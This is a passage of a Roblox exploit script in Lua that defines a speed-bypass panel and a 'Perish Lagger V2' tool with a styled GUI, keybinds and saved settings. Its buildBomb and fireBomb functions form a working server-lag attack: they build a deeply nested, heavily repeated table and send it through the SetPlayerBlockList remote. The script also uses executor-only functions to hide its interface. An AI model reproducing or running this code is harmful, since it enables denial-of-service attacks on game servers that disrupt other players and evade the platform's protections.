 n = tonumber(n) or 97000
 if n >= 1000 then return string.format("%dK", math.floor(n / 1000 + 0.5)) end
 return tostring(n)
	end

	local function syncActivateUI()
 local label = active and "DEACTIVATE" or "ACTIVATE"
 local bg = active and Color3.fromRGB(200, 0, 0) or Color3.fromRGB(16, 16, 16)
 local tc = active and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(41, 128, 255)
 activateButton.Text = label
 activateButton.BackgroundColor3 = bg
 activateButton.TextColor3 = tc
 miniActivate.Text = label
 miniActivate.BackgroundColor3 = bg
 miniActivate.TextColor3 = tc
 statusLabel.Text = active and "ONLINE" or "OFFLINE"
 statusLabel.TextColor3 = active and Color3.fromRGB(80, 255, 120) or Color3.fromRGB(200, 200, 200)
	end

	-- setActive: bình thường — KHÔNG nhận diện brainrot / không auto OFF
	local function setActive(state, fromUser)
 state = state and true or false
 local panelOpen = (main.Visible or mini.Visible) and true or false
 if fromUser then
 userWantedActive = state
 uiWantedActive = state
 end
 local shouldRun = state and panelOpen
 active = shouldRun
 uiActive = shouldRun
 if active then
 startedAt = os.clock()
 local n = math.clamp(tonumber(powerBox.Text) or 97000, 1, 999999)
 startBypass(n)
 else
 stopBypass()
 timerText.Text = "00:00"
 end
 syncActivateUI()
 -- Lưu trạng thái ON/OFF + panel
 pcall(function() saveCfg(main, powerBox.Text) end)
	end

	local function applyBg(idx)
 savedBgIndex = math.clamp(tonumber(idx) or 1, 1, #BG_IDS)
 local id = BG_IDS[savedBgIndex]
 bgImg.Image = "rbxassetid://" .. id
 miniBg.Image = bgImg.Image
 bgButton.Text = "#" .. tostring(savedBgIndex)
 saveCfg(main, powerBox.Text)
	end

	local function setMinimized(on)
 minimized = on and true or false
 uiMinimized = minimized
 if minimized then
 mini.Position = main.Position
 main.Visible = false
 mini.Visible = true
 else
 main.Position = mini.Position
 mini.Visible = false
 main.Visible = true
 end
 _G.AceVisBypassPanelOpen = true
 pcall(function() saveCfg(main, powerBox.Text) end)
	end

	-- Events
	activateButton.MouseButton1Click:Connect(function()
 setActive(not (userWantedActive or active), true)
	end)
	miniActivate.MouseButton1Click:Connect(function()
 setActive(not (userWantedActive or active), true)
	end)

	powerBox.FocusLost:Connect(function()
 local n = math.clamp(tonumber(powerBox.Text) or 97000, 1, 999999)
 powerBox.Text = tostring(n)
 powerText.Text = formatPower(n)
 _G.AceVisBypassPower = n
 saveCfg(main, n)
 if active then startBypass(n) end
	end)

	kbButton.MouseButton1Click:Connect(function()
 waitingForKey = true
 kbButton.Text = "..."
	end)

	bgButton.MouseButton1Click:Connect(function()
 applyBg((savedBgIndex % #BG_IDS) + 1)
	end)

	local function syncLockUI()
 local t = locked and "UNLOCK" or "LOCK"
 local bg = locked and Color3.fromRGB(80, 30, 30) or Color3.fromRGB(30, 30, 30)
 lockBtn.Text = t
 lockBtn.BackgroundColor3 = bg
 miniLock.Text = t
 miniLock.BackgroundColor3 = bg
	end
	lockBtn.MouseButton1Click:Connect(function()
 forceSetLocked(not locked)
 pcall(function() saveCfg(main, powerBox and powerBox.Text or "97000") end)
	end)
	miniLock.MouseButton1Click:Connect(function()
 forceSetLocked(not locked)
 pcall(function() saveCfg(main, powerBox and powerBox.Text or "97000") end)
	end)
	-- Double-check: nếu UI báo UNLOCK mà vẫn locked=true → bấm lại force
	_G.AceSetVisBypassLock = function(on)
 forceSetLocked(on)
	end

	hideBtn.MouseButton1Click:Connect(function() setMinimized(true) end)
	unhideBtn.MouseButton1Click:Connect(function() setMinimized(false) end)

	-- Drag (main + mini) — riêng lock Speed Bypass, không dính St.guiLock
	-- Kéo bằng header / vùng trống; Unlock phải kéo được ngay
	local function makeDrag(frame)
 local dragging, dragStart, startPos = false, nil, nil
 local UIS_ = UserInputService or UIS or game:GetService("UserInputService")
 local function isInteractive(obj)
 while obj and obj ~= frame do
 if obj:IsA("TextBox") then return true end
 if obj:IsA("GuiButton") then
 local n = tostring(obj.Name or "")
 -- cho phép kéo nếu bấm vào vùng không phải nút chức năng quan trọng
 if n == "LockBtn" or n == "MiniLock" or n == "CloseBtn" or n == "HideBtn"
 or n == "UnhideBtn" or n == "ActivateBtn" or n == "KbBtn" or n == "BgBtn" then
 return true
 end
 -- TextButton con khác (level...) cũng không bắt đầu drag
 return true
 end
 obj = obj.Parent
 end
 return false
 end
 -- Header drag handle: top 36px luôn kéo được khi unlock
 local dragPad = frame:FindFirstChild("DragPad")
 if not dragPad then
 dragPad = Instance.new("TextButton")
 dragPad.Name = "DragPad"
 dragPad.Size = UDim2.new(1, -100, 0, 36)
 dragPad.Position = UDim2.new(0, 0, 0, 0)
 dragPad.BackgroundTransparency = 1
 dragPad.Text = ""
 dragPad.ZIndex = 50
 dragPad.AutoButtonColor = false
 dragPad.Parent = frame
 end
 local function beginDrag(input)
 if locked then return end
 if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
 return
 end
 dragging = true
 dragStart = input.Position
 startPos = frame.Position
 end
 dragPad.InputBegan:Connect(beginDrag)
 frame.InputBegan:Connect(function(input)
 if locked then return end
 if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
 return
 end
 -- vùng trống (không nút) vẫn kéo
 if isInteractive(input.Target) then return end
 beginDrag(input)
 end)
 UIS_.InputChanged:Connect(function(input)
 if not dragging then return end
 if locked then
 dragging = false
 return
 end
 if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then
 return
 end
 local d = input.Position - dragStart
 local np = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 frame.Position = np
 if frame == main and mini then mini.Position = np end
 if frame == mini and main then main.Position = np end
 end)
 UIS_.InputEnded:Connect(function(input)
 if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
 return
 end
 if not dragging then return end
 dragging = false
 pcall(function()
 local p = main and main.Position
 if p then
 savedPos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
 _G.AceVisBypassPanelPosition = savedPos
 end
 saveCfg(main, powerBox and powerBox.Text or "97000")
 end)
 end)
	end

	forceSetLocked = function(on)
 locked = on and true or false
 _G.AceVisBypassLocked = locked
 if type(St) == "table" then St.speedBypassLock = locked end
 -- bảo đảm Active để nhận input sau unlock
 pcall(function()
 if main then main.Active = true end
 if mini then mini.Active = true end
 end)
 pcall(syncLockUI)
	end

	makeDrag(main)
	makeDrag(mini)

	-- PC keybind
	UserInputService.InputBegan:Connect(function(input, gpe)
 if waitingForKey and input.UserInputType == Enum.UserInputType.Keyboard then
 if input.KeyCode ~= Enum.KeyCode.Escape and input.KeyCode ~= Enum.KeyCode.Unknown then
 boundKey = input.KeyCode
 kbButton.Text = boundKey.Name
 waitingForKey = false
 saveCfg(main, powerBox.Text)
 else
 waitingForKey = false
 kbButton.Text = boundKey.Name
 end
 return
 end
 if gpe then return end
 if input.UserInputType == Enum.UserInputType.Keyboard and boundKey and input.KeyCode == boundKey then
 -- chỉ toggle khi panel đang hiện (full hoặc mini)
 if main.Visible or mini.Visible then
 setActive(not (userWantedActive or active), true)
 end
 end
	end)

	-- Chỉ OFF khi ẩn panel — KHÔNG nhận diện brainrot / WalkSpeed
	RunService.Heartbeat:Connect(function()
 local panelOpen = main.Visible or mini.Visible
 if not panelOpen then
 if active then
 active = false
 stopBypass()
 syncActivateUI()
 end
 end
	end)

	-- Timer
	RunService.RenderStepped:Connect(function()
 if active then
 local elapsed = math.floor(os.clock() - startedAt)
 timerText.Text = string.format("%02d:%02d", math.floor(elapsed / 60), elapsed % 60)
 end
	end)

	local function setPanelVisible(on, opts)
 on = on and true or false
 opts = type(opts) == "table" and opts or {}
 if not on then
 -- Ẩn panel → OFF bypass + lưu PanelOpen=false
 userWantedActive = false
 uiWantedActive = false
 if active then setActive(false, false) end
 stopBypass()
 active = false
 uiActive = false
 if main and main.Parent then
 local p = (minimized and mini or main).Position
 savedPos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
 _G.AceVisBypassPanelPosition = savedPos
 end
 main.Visible = false
 mini.Visible = false
 minimized = false
 uiMinimized = false
 _G.AceVisBypassPanelOpen = false
 syncActivateUI()
 saveCfg(main, powerBox.Text, { PanelOpen = false, Minimized = false, WantedActive = false })
 return
 end
 local sp = _G.AceVisBypassPanelPosition or savedPos
 if type(sp) == "table" then
 local pos = UDim2.new(tonumber(sp.xs) or 0.5, tonumber(sp.xo) or -115, tonumber(sp.ys) or 0.35, tonumber(sp.yo) or 0)
 main.Position = pos
 mini.Position = pos
 end
 local wantMini = opts.minimized == true or (opts.minimized == nil and savedMinimized == true and opts.fromLoad == true)
 minimized = wantMini and true or false
 uiMinimized = minimized
 if minimized then
 main.Visible = false
 mini.Visible = true
 else
 main.Visible = true
 mini.Visible = false
 end
 _G.AceVisBypassPanelOpen = true
 pcall(function()
 if gui then
 gui.Enabled = true
 gui.DisplayOrder = 250
 if not gui.Parent then
 local parent = (gethui and gethui()) or game:GetService("CoreGui")
 gui.Parent = parent
 end
 end
 end)
 pcall(function()
 saveCfg(main, powerBox and powerBox.Text or "97000", { PanelOpen = true, Minimized = minimized })
 end)
 -- Restore bypass nếu trước đó đang ON
 if opts.restoreActive or (opts.fromLoad and savedWantedActive) then
 userWantedActive = true
 uiWantedActive = true
 setActive(true, false)
 end
	end

	_G.AceSetVisBypassPanelVisible = setPanelVisible
	_G.AceToggleVisBypassPanel = function()
 setPanelVisible(not (main.Visible or mini.Visible))
	end

	closeBtn.MouseButton1Click:Connect(function()
 setPanelVisible(false)
	end)

	-- init
	powerText.Text = formatPower(powerBox.Text)
	applyBg(savedBgIndex)
	syncActivateUI()
	-- Tự hiện panel nếu lần trước không ẩn (PanelOpen=true)
	-- No tự mở panel khi ON script — chỉ mở khi Settings Show Panel = true
	_G.AceSetVisBypassLock = function(on)
 locked = on and true or false
 _G.AceVisBypassLocked = locked
 pcall(syncLockUI)
	end
	-- sync lock từ St / _G (độc lập Lock UI menu)
	pcall(function()
 local wantLock = false
 if type(St) == "table" and St.speedBypassLock then wantLock = true end
 if _G.AceVisBypassLocked == true then wantLock = true end
 locked = wantLock
 syncLockUI()
	end)
	task.defer(function()
 task.wait(0.15)
 local wantOpen = false
 pcall(function()
 if type(St) == "table" and St.showSpeedBypassPanel == true then wantOpen = true end
 end)
 if wantOpen then
 pcall(function()
 setPanelVisible(true, { fromLoad = true, minimized = false, restoreActive = false })
 end)
 else
 -- luôn ẩn khi load nếu user không ON show
 pcall(function()
 if main then main.Visible = false end
 if mini then mini.Visible = false end
 _G.AceVisBypassPanelOpen = false
 saveCfg(main, powerBox and powerBox.Text or "97000", { PanelOpen = false })
 end)
 end
	end)
	print("[Vis] ZenonetopBypass panel loaded (Noxa-style + keybind + minimize + remember open)")
end)



-- ============================================================

-- PERISH LAGGER V2 — isolated function scope (tránh 200 local limit)
task.spawn(function()
	local Players = game:GetService("Players")
	local UserInputService = game:GetService("UserInputService")
	local TweenService = game:GetService("TweenService")
	local CoreGui = game:GetService("CoreGui")
	local HttpService = game:GetService("HttpService")
	local RunService = game:GetService("RunService")
	local Stats = game:GetService("Stats")

	local LP = Players.LocalPlayer
	local PlayerGui = LP:WaitForChild("PlayerGui")
	local ConfigFile = "ZenonetopPerishLaggerV2.json"

	local NIVELES = {
 Low = { poder = 23 },
 Mid = { poder = 32 },
 High = { poder = 70 },
 Ultra = { poder = 90 },
	}
	local ORDER = { "Low", "Mid", "High", "Ultra" }

	local keybind = Enum.KeyCode.M
	local listeningForInput = false
	local laggerActive = false
	local lagThread = nil
	local nivelActual = "Low"
	local ventanaBloqueada = false

	local C = {
 BG = Color3.fromRGB(8, 0, 0),
 Row = Color3.fromRGB(20, 4, 4),
 Card = Color3.fromRGB(30, 6, 6),
 Red = Color3.fromRGB(255, 20, 20),
 RedDeep = Color3.fromRGB(120, 0, 0),
 RedSoft = Color3.fromRGB(255, 80, 80),
 RedDark = Color3.fromRGB(60, 8, 8),
 Text = Color3.fromRGB(255, 255, 255),
 TextDim = Color3.fromRGB(200, 180, 180),
 Stroke = Color3.fromRGB(255, 30, 30),
 Dark = Color3.fromRGB(5, 0, 0),
 Off = Color3.fromRGB(40, 10, 10),
 White = Color3.fromRGB(255, 255, 255),
 Gray = Color3.fromRGB(128, 128, 128),
 Green = Color3.fromRGB(90, 255, 170),
 Yellow = Color3.fromRGB(255, 220, 90),
	}

	local function corner(p, r)
 local x = Instance.new("UICorner")
 x.CornerRadius = UDim.new(0, r or 10)
 x.Parent = p
 return x
	end
	local function stroke(p, col, th, tr)
 local s = Instance.new("UIStroke")
 s.Color = col or C.Stroke
 s.Thickness = th or 1.2
 s.Transparency = tr or 0.35
 s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 s.Parent = p
 return s
	end
	local function shineStroke(obj)
 local s = stroke(obj, C.Red, 1.4, 0.3)
 task.spawn(function()
 local t = 0
 while s and s.Parent do
 local mf = s:FindFirstAncestorOfClass("Frame")
 -- slow down when not on-screen heavy parent visible
 if mainFrame and not mainFrame.Visible then
 task.wait(0.6)
 else
 t = t + 0.05
 s.Transparency = 0.2 + math.sin(t * 1.6) * 0.18
 if math.sin(t * 0.8) > 0.7 then s.Color = C.White else s.Color = C.Red end
 task.wait(0.06)
 end
 end
 end)
 return s
	end
	local function highlight(obj, col)
 local g = Instance.new("UIGradient", obj)
 g.Color = ColorSequence.new({
 ColorSequenceKeypoint.new(0, col or C.Red),
 ColorSequenceKeypoint.new(0.5, C.White),
 ColorSequenceKeypoint.new(1, col or C.Red),
 })
 g.Rotation = 25
 task.spawn(function()
 while g and g.Parent do
 if mainFrame and not mainFrame.Visible then
 task.wait(0.6)
 else
 g.Offset = Vector2.new((tick() * 0.35) % 2 - 1, 0)
 task.wait(0.06)
 end
 end
 end)
 return g
	end
	local function hoverLift(btn, base)
 base = base or 0.15
 btn.MouseEnter:Connect(function()
 TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundTransparency = math.max(0, base - 0.15) }):Play()
 end)
 btn.MouseLeave:Connect(function()
 TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundTransparency = base }):Play()
 end)
 btn.MouseButton1Down:Connect(function()
 TweenService:Create(btn, TweenInfo.new(0.08), { Size = btn.Size - UDim2.new(0, 2, 0, 2) }):Play()
 end)
 btn.MouseButton1Up:Connect(function()
 -- size restore handled by parent layout mostly
 end)
	end

	local mainFrame -- forward
	local savedPos = nil
	local v2PanelScale = 70 -- declare early (tránh shadow / nil khi SaveConfig)
	local function SaveConfig()
 local data = {
 Nivel = nivelActual,
 Bloqueado = (_G.AcePerishV2Locked == true),
 Locked = (_G.AcePerishV2Locked == true),
 Key = keybind.Name,
 Scale = math.clamp(tonumber(v2PanelScale) or tonumber(_G.AcePerishV2PanelScale) or 70, 1, 100),
 PanelOpen = (_G.AcePerishV2PanelOpen == true),
 }
 -- Ưu tiên vị trí hiện tại; nếu panel đang ẩn vẫn giữ Pos đã lưu
 if mainFrame and mainFrame.Parent and mainFrame.Visible then
 local p = mainFrame.Position
 data.Pos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
 _G.AcePerishV2PanelPosition = data.Pos
 savedPos = data.Pos
 elseif type(_G.AcePerishV2PanelPosition) == "table" then
 data.Pos = _G.AcePerishV2PanelPosition
 savedPos = data.Pos
 elseif type(savedPos) == "table" then
 data.Pos = savedPos
 end
 pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
	end

	local function LoadConfig()
 pcall(function()
 if not (isfile and isfile(ConfigFile)) then return end
 local data = HttpService:JSONDecode(readfile(ConfigFile))
 nivelActual = data.Nivel or "Low"
 if data.Key and Enum.KeyCode[data.Key] then keybind = Enum.KeyCode[data.Key] end
 if type(data.Pos) == "table" then
 savedPos = data.Pos
 _G.AcePerishV2PanelPosition = data.Pos
 end
 if data.Scale then
 v2PanelScale = math.clamp(tonumber(data.Scale) or 70, 1, 100)
 _G.AcePerishV2PanelScale = v2PanelScale
 end
 if data.Locked == true or data.Bloqueado == true then
 _G.AcePerishV2Locked = true
 end
 if data.PanelOpen == true then
 _G.AcePerishV2PanelOpen = true
 end
 end)
	end
	LoadConfig()

	local cachedBomb, cachedPower = nil, nil
	local function buildBomb(poder)
 local mainT, spam = {}, {{}}
 local z = spam[1]
 for i = 1, 25 do local t = {}; table.insert(z, t); z = t end
 local max = math.min(12000, (tonumber(poder) or 23) * 50)
 for i = 1, max do table.insert(mainT, spam) end
 return mainT
	end
	local function fireBomb()
 if not cachedBomb or cachedPower ~= NIVELES[nivelActual].poder then
 cachedPower = NIVELES[nivelActual].poder
 cachedBomb = buildBomb(cachedPower)
 end
 pcall(function()
 game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(cachedBomb)
 end)
	end

	pcall(function()
 for _, parent in ipairs({ CoreGui, PlayerGui }) do
 local old = parent:FindFirstChild("Per1shccLaggerV2")
 if old then old:Destroy() end
 end
	end)

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "Per1shccLaggerV2"
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 60
	pcall(function() if syn and syn.protect_gui then syn.protect_gui(screenGui) end end)
	local okP = pcall(function() screenGui.Parent = CoreGui end)
	if not okP then screenGui.Parent = PlayerGui end

	local W, H = 286, 178

	mainFrame = Instance.new("Frame", screenGui)
	mainFrame.Name = "MainFrame"
	mainFrame.Size = UDim2.new(0, W, 0, H)
	if savedPos then
 mainFrame.Position = UDim2.new(
 tonumber(savedPos.xs) or 0.14, tonumber(savedPos.xo) or 0,
 tonumber(savedPos.ys) or 0.5, tonumber(savedPos.yo) or -H / 2
 )
	else
 mainFrame.Position = UDim2.new(0.14, 0, 0.5, -H / 2)
	end
	mainFrame.BackgroundColor3 = C.BG
	mainFrame.BackgroundTransparency = 0.08
	mainFrame.BorderSizePixel = 0
	mainFrame.ClipsDescendants = true
	mainFrame.Active = true
	mainFrame.Visible = false -- mở từ menu như V1

	-- Scale V2 panel (dùng v2PanelScale đã LoadConfig)
	v2PanelScale = math.clamp(tonumber(v2PanelScale) or tonumber(_G.AcePerishV2PanelScale) or 70, 1, 100)
	local uiScale = Instance.new("UIScale")
	uiScale.Name = "V2PanelScale"
	uiScale.Scale = v2PanelScale / 100
	uiScale.Parent = mainFrame
	_G.AcePerishV2PanelScale = v2PanelScale
	_G.AceSetPerishV2PanelScale = function(v)
 v = math.clamp(tonumber(v) or 70, 1, 100)
 v2PanelScale = v
 _G.AcePerishV2PanelScale = v
 uiScale.Scale = v / 100
 pcall(SaveConfig)
	end

	corner(mainFrame, 16)

	-- BACKGROUND IMAGE + TINT (full)
	local bgImg = Instance.new("ImageLabel", mainFrame)
	bgImg.Size = UDim2.new(1, 0, 1, 0)
	bgImg.BackgroundTransparency = 1
	bgImg.Image = "rbxassetid://77503307528071"
	bgImg.ScaleType = Enum.ScaleType.Crop
	bgImg.ImageTransparency = 0.2
	bgImg.ZIndex = 0
	corner(bgImg, 16)

	local bgTint = Instance.new("Frame", mainFrame)
	bgTint.Size = UDim2.new(1, 0, 1, 0)
	bgTint.BackgroundColor3 = C.Dark
	bgTint.BackgroundTransparency = 0.35
	bgTint.BorderSizePixel = 0
	bgTint.ZIndex = 0
	corner(bgTint, 16)
	local tintGrad = Instance.new("UIGradient", bgTint)
	tintGrad.Rotation = 120
	tintGrad.Color = ColorSequence.new({
 ColorSequenceKeypoint.new(0, C.RedDeep),
 ColorSequenceKeypoint.new(0.55, C.BG),
 ColorSequenceKeypoint.new(1, C.Red),
	})
	tintGrad.Transparency = NumberSequence.new({
 NumberSequenceKeypoint.new(0, 0.35),
 NumberSequenceKeypoint.new(0.5, 0.75),
 NumberSequenceKeypoint.new(1, 0.4),
	})
	task.spawn(function()
 while tintGrad and tintGrad.Parent do
 tintGrad.Rotation = (tintGrad.Rotation + 0.4) % 360
 task.wait(0.05)
 end
	end)

	shineStroke(mainFrame)

	-- PARTICLES (full)
	local particles = {}
	for i = 1, 26 do
 local p = Instance.new("Frame", mainFrame)
 p.BorderSizePixel = 0
 p.BackgroundColor3 = (i % 3 == 0) and C.White or C.RedSoft
 local s = 1 + math.random() * 2
 p.Size = UDim2.new(0, s, 0, s)
 p.Position = UDim2.new(math.random(), 0, math.random(), 0)
 p.BackgroundTransparency = 0.25 + math.random() * 0.5
 p.ZIndex = 1
 corner(p, 99)
 table.insert(particles, {
 frame = p,
 base = p.BackgroundTransparency,
 timer = 1.5 + math.random() * 2.5,
 elapsed = 0,
 })
	end
	task.spawn(function()
 while mainFrame and mainFrame.Parent do
 if not mainFrame.Visible then
 task.wait(0.5)
 else
 for _, d in ipairs(particles) do
 local fr = d.frame
 if fr and fr.Parent then
 d.elapsed = d.elapsed + 0.1
 fr.Position = fr.Position + UDim2.new(0, 0, 0, -0.25)
 if fr.Position.Y.Scale < 0 then
 fr.Position = UDim2.new(math.random(), 0, 1, 0)
 end
 if d.elapsed >= d.timer then
 d.elapsed = 0
 d.timer = 1.5 + math.random() * 2.5
 TweenService:Create(fr, TweenInfo.new(0.5), { BackgroundTransparency = 1 }):Play()
 task.delay(0.2, function()
 if not d.frame or not d.frame.Parent then return end
 d.frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
 local ns = 1 + math.random() * 2
 d.frame.Size = UDim2.new(0, ns, 0, ns)
 TweenService:Create(d.frame, TweenInfo.new(0.5), { BackgroundTransparency = d.base }):Play()
 end)
 end
 end
 end
 task.wait(0.1)
 end -- else/if
 end -- while
	end) -- particle task.spawn

	-- HEADER
	local header = Instance.new("Frame", mainFrame)
	header.Size = UDim2.new(1, 0, 0, 48)
	header.BackgroundTransparency = 1
	header.ZIndex = 3

	local av = Instance.new("ImageLabel", header)
	av.Size = UDim2.new(0, 30, 0, 30)
	av.Position = UDim2.new(0, 12, 0, 9)
	av.BackgroundColor3 = C.RedDeep
	av.Image = "rbxthumb://type=AvatarHeadShot&id=" .. LP.UserId .. "&w=150&h=150"
	av.ScaleType = Enum.ScaleType.Crop
	av.ZIndex = 3
	corner(av, 9)
	stroke(av, C.Red, 1, 0.4)

	local title = Instance.new("TextLabel", header)
	title.BackgroundTransparency = 1
	title.Position = UDim2.new(0, 50, 0, 8)
	title.Size = UDim2.new(0, 150, 0, 19)
	title.Font = Enum.Font.GothamBlack
	title.Text = "ZenonetopUser V2"
	title.TextColor3 = C.White
	title.TextSize = 18
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.ZIndex = 3
	highlight(title, C.Red)

	local subtitle = Instance.new("TextLabel", header)
	subtitle.BackgroundTransparency = 1
	subtitle.Position = UDim2.new(0, 50, 0, 26)
	subtitle.Size = UDim2.new(0, 170, 0, 12)
	subtitle.Font = Enum.Font.GothamBold
	subtitle.Text = "ZenonetopUser module"
	subtitle.TextColor3 = C.TextDim
	subtitle.TextSize = 10
	subtitle.TextXAlignment = Enum.TextXAlignment.Left
	subtitle.ZIndex = 3

	-- LOCK / UNLOCK (bên phải, giống Ping Lagger)
	local v2Locked = false
	local lockBtn = Instance.new("TextButton", header)
	lockBtn.Name = "LockBtn"
	lockBtn.Size = UDim2.new(0, 52, 0, 22)
	lockBtn.Position = UDim2.new(1, -64, 0.5, -11)
	lockBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
	lockBtn.BorderSizePixel = 0
	lockBtn.Text = "LOCK"
	lockBtn.TextColor3 = C.TextDim
	lockBtn.Font = Enum.Font.GothamBold
	lockBtn.TextSize = 9
	lockBtn.AutoButtonColor = false
	lockBtn.ZIndex = 10
	corner(lockBtn, 6)
	stroke(lockBtn, C.Red, 1, 0.55)
	local function setV2Locked(on)
 v2Locked = on and true or false
 lockBtn.Text = v2Locked and "UNLOCK" or "LOCK"
 lockBtn.BackgroundColor3 = v2Locked and Color3.fromRGB(80, 30, 30) or Color3.fromRGB(25, 25, 28)
 lockBtn.TextColor3 = v2Locked and C.White or C.TextDim
	end
	lockBtn.MouseButton1Click:Connect(function()
 setV2Locked(not v2Locked)
 _G.AcePerishV2Locked = v2Locked
 pcall(SaveConfig)
	end)
	_G.AceIsPerishV2Locked = function()
 return v2Locked == true
	end
	_G.AceSetPerishV2Locked = function(on)
 setV2Locked(on)
 _G.AcePerishV2Locked = v2Locked
 pcall(SaveConfig)
	end

	local sep = Instance.new("Frame", mainFrame)
	sep.Size = UDim2.new(1, -28, 0, 1)
	sep.Position = UDim2.new(0, 14, 0, 48)
	sep.BorderSizePixel = 0
	sep.BackgroundColor3 = C.Red
	sep.ZIndex = 3
	local sepG = Instance.new("UIGradient", sep)
	sepG.Color = ColorSequence.new({
 ColorSequenceKeypoint.new(0, C.Red),
 ColorSequenceKeypoint.new(0.5, C.White),
 ColorSequenceKeypoint.new(1, C.Red),
	})
	sepG.Transparency = NumberSequence.new({
 NumberSequenceKeypoint.new(0, 1),
 NumberSequenceKeypoint.new(0.5, 0.05),
 NumberSequenceKeypoint.new(1, 1),
	})
	task.spawn(function()
 while sepG and sepG.Parent do
 if mainFrame and not mainFrame.Visible then
 task.wait(0.5)
 else
 sepG.Offset = Vector2.new((tick() * 0.4) % 2 - 1, 0)
 task.wait(0.05)
 end
 end
	end)

	-- ROW LAGGER + TOGGLE
	local row = Instance.new("Frame", mainFrame)
	row.Position = UDim2.new(0, 12, 0, 58)
	row.Size = UDim2.new(1, -24, 0, 34)
	row.BackgroundColor3 = C.Row
	row.BackgroundTransparency = 0.25
	row.BorderSizePixel = 0
	row.ZIndex = 2
	corner(row, 10)
	stroke(row, C.Red, 1, 0.6)

	local textLagger = Instance.new("TextLabel", row)
	textLagger.BackgroundTransparency = 1
	textLagger.Position = UDim2.new(0, 12, 0, 0)
	textLagger.Size = UDim2.new(0, 110, 1, 0)
	textLagger.Font = Enum.Font.GothamBlack
	textLagger.Text = "LAGGER"
	textLagger.TextColor3 = C.Text
	textLagger.TextSize = 13
	textLagger.TextXAlignment = Enum.TextXAlignment.Left
	textLagger.ZIndex = 3

	local powerLabel = Instance.new("TextLabel", row)
	powerLabel.BackgroundTransparency = 1
	powerLabel.Position = UDim2.new(0, 12, 0, 0)
	powerLabel.Size = UDim2.new(1, -100, 1, 0)
	powerLabel.Font = Enum.Font.GothamBold
	powerLabel.Text = "POWER 23"
	powerLabel.TextColor3 = C.TextDim
	powerLabel.TextSize = 9
	powerLabel.TextXAlignment = Enum.TextXAlignment.Right
	powerLabel.ZIndex = 3

	local toggleContainer = Instance.new("Frame", row)
	toggleContainer.BackgroundColor3 = C.Off
	toggleContainer.Position = UDim2.new(1, -78, 0.5, -11)
	toggleContainer.Size = UDim2.new(0, 68, 0, 22)
	toggleContainer.BorderSizePixel = 0
	toggleContainer.ZIndex = 3
	corner(toggleContainer, 99)
	stroke(toggleContainer, C.Red, 1, 0.5)

	local toggleBall = Instance.new("Frame", toggleContainer)
	toggleBall.BackgroundColor3 = C.RedSoft
	toggleBall.Size = UDim2.new(0, 18, 0, 18)
	toggleBall.Position = UDim2.new(0, 2, 0.5, -9)
	toggleBall.BorderSizePixel = 0
	toggleBall.ZIndex = 4
	corner(toggleBall, 99)

	local toggleClick = Instance.new("TextButton", toggleContainer)
	toggleClick.BackgroundTransparency = 1
	toggleClick.Size = UDim2.new(1, 0, 1, 0)
	toggleClick.ZIndex = 5
	toggleClick.Font = Enum.Font.GothamBlack
	toggleClick.Text = "OFF"
	toggleClick.TextSize = 9
	toggleClick.TextColor3 = C.Red
	toggleClick.AutoButtonColor = false

	-- LEVEL BAR
	local levelBar = Instance.new("Frame", mainFrame)
	levelBar.Position = UDim2.new(0, 12, 0, 98)
	levelBar.Size = UDim2.new(1, -24, 0, 30)
	levelBar.BackgroundColor3 = C.Row
	levelBar.BackgroundTransparency = 0.3
	levelBar.BorderSizePixel = 0
	levelBar.ZIndex = 2
	corner(levelBar, 10)
	stroke(levelBar, C.Red, 1, 0.6)

	local pad = Instance.new("UIPadding", levelBar)
	pad.PaddingLeft = UDim.new(0, 4)
	pad.PaddingRight = UDim.new(0, 4)
	pad.PaddingTop = UDim.new(0, 4)
	pad.PaddingBottom = UDim.new(0, 4)
	local grid = Instance.new("UIListLayout", levelBar)
	grid.FillDirection = Enum.FillDirection.Horizontal
	grid.Padding = UDim.new(0, 4)
	grid.HorizontalAlignment = Enum.HorizontalAlignment.Center

	local btns, strokes = {}, {}
	for _, name in ipairs(ORDER) do
 local b = Instance.new("TextButton", levelBar)
 b.Size = UDim2.new(0.25, -4, 1, 0)
 b.BackgroundColor3 = C.Card
 b.BackgroundTransparency = 0.15
 b.Font = Enum.Font.GothamBlack
 b.Text = name:upper()
 b.TextSize = 10
 b.TextColor3 = C.TextDim
 b.AutoButtonColor = false
 b.BorderSizePixel = 0
 b.ZIndex = 3
 corner(b, 8)
 hoverLift(b)
 btns[name] = b
 strokes[name] = stroke(b, C.Red, 1, 0.6)
	end

	-- FOOTER: chỉ KEY (không ms)
	local footer = Instance.new("Frame", mainFrame)
	footer.Position = UDim2.new(0, 12, 1, -42)
	footer.Size = UDim2.new(1, -24, 0, 30)
	footer.BackgroundColor3 = C.Row
	footer.BackgroundTransparency = 0.3
	footer.BorderSizePixel = 0
	footer.ZIndex = 2
	corner(footer, 10)
	stroke(footer, C.Red, 1, 0.6)

	local keybindButton = Instance.new("TextButton", footer)
	keybindButton.Position = UDim2.new(0, 6, 0.5, -10)
	keybindButton.Size = UDim2.new(1, -12, 0, 20)
	keybindButton.BackgroundColor3 = C.Card
